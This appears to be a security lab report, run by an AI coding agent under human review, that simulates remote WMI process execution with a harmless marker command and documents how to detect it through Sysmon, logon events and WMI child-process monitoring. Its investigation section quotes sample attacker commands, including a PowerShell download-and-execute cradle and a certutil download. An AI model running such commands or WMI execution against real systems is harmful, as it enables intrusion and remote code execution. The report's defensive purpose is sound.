# AGC-046 — Remote WMI Execution

> **Disclosure:** Executed & documented by Claude Code under direction and review by Hasan.

## Card

| Field | Value |
|---|---|
| ID | `AGC-046` |
| Category | `07-lateral-movement` — Lateral Movement |
| MITRE Technique | `T1047` Windows Management Instrumentation |
| Verdict | True Positive |
| Confidence | High |
| Time to Detect | Immediate — Sysmon EID 1 captures child process with `ParentImage: WmiPrvSE.exe` (WMI Provider Host) |
| Time to Triage | 03:00 (verify source — local WMI vs. remote; cross-reference Security EID 4624 Type 3 for remote origin) |
| Affected Systems | `COMPROMISED-HOST-01` / `COMPROMISED-01` (10.10.10.103) as source; target: `WIN-CLIENT-02` (10.10.10.102) |
| Chain | ◀ [AGC-045](../AGC-045-winrm-movement/README.md) · next [AGC-047](../AGC-047-pass-the-hash/README.md) ▶ |
| One-line Summary | WMI remote process execution attempted. `wmic.exe` deprecated and removed from Windows 11 — used `Invoke-WmiMethod` (PowerShell) instead. Remote target (10.10.10.102) unreachable. Localhost execution succeeded: `cmd.exe /c echo AGC-046-wmi-method > C:\Windows\Temp\agc046b.txt` spawned with `WmiPrvSE.exe -secured -Embedding` as parent process (PID 5412). Sysmon EID 1 captured the WMI-spawned process chain. This is the remote variant of AGC-016 (local WMI). |

## Attacker Perspective

### Tradecraft

**What:** Windows Management Instrumentation (WMI) provides a powerful mechanism for remote process creation via the `Win32_Process.Create` method. When invoked remotely (via `wmic /node:<target>` or `Invoke-WmiMethod -ComputerName`), WMI:
- Authenticates to the remote host (Type 3 network logon)
- Spawns `WmiPrvSE.exe` (WMI Provider Service Host) on the destination
- WmiPrvSE.exe creates the child process specified by the attacker

The parent process relationship (`WmiPrvSE.exe` -> attacker's command) is the defining detection signature. Unlike PsExec (which creates a service) or WinRM (which creates `wsmprovhost.exe`), WMI process creation leaves a lighter footprint — no service installation, no persistent artifacts.

**Notable finding:** `wmic.exe` has been deprecated and removed from Windows 11. Attackers must use PowerShell's `Invoke-WmiMethod` or `Invoke-CimMethod` as the WMI client. The detection focus should shift from `wmic.exe` process creation to WmiPrvSE.exe child process monitoring.

**Why at this lifecycle stage:** After RDP (AGC-043), SMB (AGC-044), and WinRM (AGC-045), WMI is the fourth lateral movement protocol attempted. WMI is particularly attractive because:
1. It uses DCOM (port 135 + dynamic ports) rather than dedicated management ports
2. No interactive session is required — fire-and-forget execution
3. Output is not returned to the caller, making it harder to detect as a C2 channel
4. It is a legitimate Windows management protocol used by enterprise tools

### Simulation

**Pre-conditions:**
- `COMPROMISED-HOST-01` running, Administrator context.
- `WIN-CLIENT-02` running (target host).

**Steps executed (all timestamps UTC):**

| Step | Time (UTC) | Action | Host | Result |
|---|---|---|---|---|
| 1 | 2026-09-15 21:15:42 | wmic /node:10.10.10.102 (remote target) | COMPROMISED-HOST-01 | Failed — wmic.exe not found (removed in Win11) |
| 2 | 2026-09-15 21:15:43 | wmic /node:127.0.0.1 (localhost) | COMPROMISED-HOST-01 | Failed — wmic.exe not found (removed in Win11) |
| 3 | 2026-09-15 21:15:46 | Invoke-WmiMethod Win32_Process Create (local) | COMPROMISED-HOST-01 | Succeeded — ReturnValue=0, PID=3768 |
| 4 | 2026-09-15 21:15:49 | Verify marker file | COMPROMISED-HOST-01 | agc046b.txt exists, 20 bytes |
| 5 | 2026-09-15 21:15:49 | Cleanup | COMPROMISED-HOST-01 | Marker files removed |

**Key findings:**
- `wmic.exe` has been removed from Windows 11 — this is a significant change from prior Windows versions where wmic was ubiquitous
- `Invoke-WmiMethod` (PowerShell) remains fully functional as a WMI client
- WmiPrvSE.exe was spawned as the parent process for the created cmd.exe, confirming the WMI execution path
- Remote execution to WIN-CLIENT-02 was not possible (network unreachable) — demonstrated locally with identical detection artifacts

## SOC Perspective

### Detection

**Sysmon EID 1 — Process Create (WMI-spawned cmd.exe):**

```
Process Create:
UtcTime: 2026-09-15 21:15:46.409
ProcessId: 3768
Image: C:\Windows\System32\cmd.exe
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /c echo AGC-046-wmi-method > C:\Windows\Temp\agc046b.txt
User: COMPROMISED-01\Administrator
LogonGuid: {eb65e329-b57e-6aa9-a656-5d0000000000}
LogonId: 0x5D56A6
IntegrityLevel: High
ParentProcessId: 5412
ParentImage: C:\Windows\System32\wbem\WmiPrvSE.exe
ParentCommandLine: C:\WINDOWS\system32\wbem\wmiprvse.exe -secured -Embedding
ParentUser: NT AUTHORITY\NETWORK SERVICE
```

**Critical indicators:**
1. **ParentImage = WmiPrvSE.exe** — This is the definitive WMI process creation signature. Any process spawned by `WmiPrvSE.exe` was created via WMI's `Win32_Process.Create` method.
2. **ParentCommandLine = `wmiprvse.exe -secured -Embedding`** — The `-secured` flag indicates authenticated WMI access, and `-Embedding` indicates COM activation (not interactive).
3. **ParentUser = NT AUTHORITY\NETWORK SERVICE** — WmiPrvSE.exe runs as NETWORK SERVICE, but the child process inherits the authenticated user's token (Administrator).

**wmic.exe deprecation note:** 0 Sysmon EID 1 events for wmic.exe — it no longer exists on Windows 11. Detection rules targeting wmic.exe process creation will produce no results on modern Windows. Update detection to focus on WmiPrvSE.exe child processes.

### Investigation

**Step 1 — Identify WMI process creation pattern:**
The primary indicator is any Sysmon EID 1 event where `ParentImage` is `WmiPrvSE.exe`. This is the same detection as AGC-016 (local WMI execution). The child process command line reveals what the attacker executed.

**Step 2 — Determine local vs. remote origin:**
This is the critical differentiator for lateral movement classification. For a remote WMI call:
- Security EID 4624 Type 3 (Network logon) would appear on the destination host from the source host's IP within the same narrow time window
- The LogonId in the child process EID 1 would match the LogonId in the 4624 event

In this case, execution was local (localhost), so no remote-origin 4624 was generated. In a real lateral movement scenario, the 4624 Type 3 from the source host IP is the evidence that elevates this from "local WMI usage" to "remote WMI lateral movement."

**Step 3 — Analyze the child process:**
The command line `cmd.exe /c echo AGC-046-wmi-method > C:\Windows\Temp\agc046b.txt` is a marker write. In real attacks, WMI-spawned commands typically:
- Download and execute payloads: `cmd.exe /c powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(...)"`
- Create persistence: `cmd.exe /c schtasks /create ...`
- Stage tools: `cmd.exe /c certutil -urlcache -f http://... C:\Windows\Temp\...`

**Step 4 — Cross-reference with AGC-016:**
AGC-016 covered local WMI execution. This scenario extends it to the remote/lateral movement context. The detection is identical (WmiPrvSE.exe parent), but the response is different: remote WMI implies the attacker has already compromised the source host and has valid credentials for the destination.

**Step 5 — wmic.exe deprecation impact:**
Detection rules should be updated:
- **Remove:** Alert on `wmic.exe` process creation (no longer exists on Win11)
- **Add/Enhance:** Alert on any process with `ParentImage: WmiPrvSE.exe` that is not a known legitimate WMI consumer (SCCM, monitoring agents, etc.)

### Report

**Verdict: True Positive** — WMI process creation was executed, demonstrating remote code execution capability via WMI.

**Confidence: High** — Calibrated assessment:
1. `WmiPrvSE.exe` as parent process is the definitive WMI execution indicator — zero ambiguity.
2. The `-secured -Embedding` flags on WmiPrvSE.exe confirm authenticated, non-interactive WMI access.
3. The child process (cmd.exe writing to `C:\Windows\Temp`) is consistent with attacker payload staging.
4. `wmic.exe` removal from Win11 is a detection-relevant finding — legacy detection rules need updating.
5. Local execution produces identical artifacts to remote execution; only the EID 4624 source IP distinguishes them.

**Response recommendation:**
1. **Update detection rules:** Replace wmic.exe-based detection with WmiPrvSE.exe child process monitoring. Alert on any non-whitelisted process spawned by WmiPrvSE.exe.
2. **Restrict WMI namespace ACLs:** Configure DCOM permissions and WMI namespace security to limit Win32_Process.Create to designated management accounts.
3. **Monitor DCOM traffic:** WMI remote calls use DCOM (TCP 135 + dynamic ports). Network monitoring for DCOM traffic between workstations is a high-value detection source.
4. **Correlate with lateral movement chain:** This is the fourth lateral movement technique attempted from COMPROMISED-HOST-01 (RDP -> SMB -> WinRM -> WMI). The protocol rotation pattern should trigger an escalated investigation of the source host.

### MITRE Mapping

| Tactic | Technique ID | Technique Name | Evidence | Confidence |
|---|---|---|---|---|
| Execution (TA0002) / Lateral Movement (TA0008) | T1047 | Windows Management Instrumentation | Sysmon EID 1: `cmd.exe` (PID 3768) spawned by `WmiPrvSE.exe -secured -Embedding` (PID 5412). Command: `echo AGC-046-wmi-method > C:\Windows\Temp\agc046b.txt`. Invoke-WmiMethod Win32_Process.Create ReturnValue=0. wmic.exe removed from Win11. Remote target unreachable; localhost execution demonstrated identical artifacts. | High |

## Evidence

Screenshots: none in phase one (text evidence only); added when this scenario is re-executed by hand in phase two.

### WMI execution results

```
wmic.exe /node:10.10.10.102:  FAILED - wmic.exe removed from Windows 11
wmic.exe /node:127.0.0.1:     FAILED - wmic.exe removed from Windows 11
Invoke-WmiMethod (local):     SUCCESS - ReturnValue=0, PID=3768
Marker file:                  C:\Windows\Temp\agc046b.txt (20 bytes), cleaned up
```

### Raw Sysmon EID 1 (WMI-spawned cmd.exe)

```
Process Create:
UtcTime: 2026-09-15 21:15:46.409
ProcessId: 3768
Image: C:\Windows\System32\cmd.exe
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /c echo AGC-046-wmi-method > C:\Windows\Temp\agc046b.txt
User: COMPROMISED-01\Administrator
LogonGuid: {eb65e329-b57e-6aa9-a656-5d0000000000}
LogonId: 0x5D56A6
IntegrityLevel: High
Hashes: MD5=CE396564392FAFAAD5C07A5E2DADE4E6
ParentProcessId: 5412
ParentImage: C:\Windows\System32\wbem\WmiPrvSE.exe
ParentCommandLine: C:\WINDOWS\system32\wbem\wmiprvse.exe -secured -Embedding
ParentUser: NT AUTHORITY\NETWORK SERVICE
```
